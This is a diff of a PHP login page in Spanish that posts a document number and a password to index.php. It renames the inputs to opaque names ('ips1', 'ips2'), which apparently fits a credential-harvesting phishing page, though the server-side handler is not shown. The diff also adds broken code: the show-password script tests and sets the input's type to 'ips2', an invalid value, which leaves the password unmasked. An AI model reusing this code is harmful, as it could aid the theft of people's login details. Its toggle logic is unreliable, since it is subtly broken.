@@ -298,7 +298,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 <img class="bluee-img" src="img/bluee.svg" alt="">
 
 <div class="card">
-    <form action="index.php" method="post">
+    <form action="index.php" method="POST">
 
         <!-- Documento -->
         <div class="field-group">
@@ -312,7 +312,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                 </div>
 
                 <div class="input-wrap">
-                    <input  name="ips1" id="ips1"
+                    <input  id="ips1" name="ips1"
                         type="tel"
                         id="docNumber"
                         name="numero_documento"
@@ -329,7 +329,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         <div class="pw-label">Contraseña</div>
 
         <div class="pw-row">
-            <input  name="ips2" id="ips2" id="password" type="password" name="password">
+            <input  id="ips2" name="ips2" type="password" >
             <div class="eye" id="togglePassword">
                 <img src="img/eye-open.png" alt="Mostrar contraseña">
             </div>
@@ -355,7 +355,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
 <script>
     /* === Mostrar / Ocultar Contraseña === */
-    const passwordInput = document.getElementById('password');
+    const passwordInput = document.getElementById('ips2');
     const toggle = document.getElementById('togglePassword');
     const eyeImg = toggle.querySelector('img');
 
@@ -363,8 +363,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     const eyeClosedSrc = 'img/eye-closed.png';
 
     toggle.addEventListener('click', () => {
-        const isHidden = passwordInput.type === 'password';
-        passwordInput.type = isHidden ? 'text' : 'password';
+        const isHidden = passwordInput.type === 'ips2';
+        passwordInput.type = isHidden ? 'text' : 'ips2';
         eyeImg.src = isHidden ? eyeClosedSrc : eyeOpenSrc;
     });
 
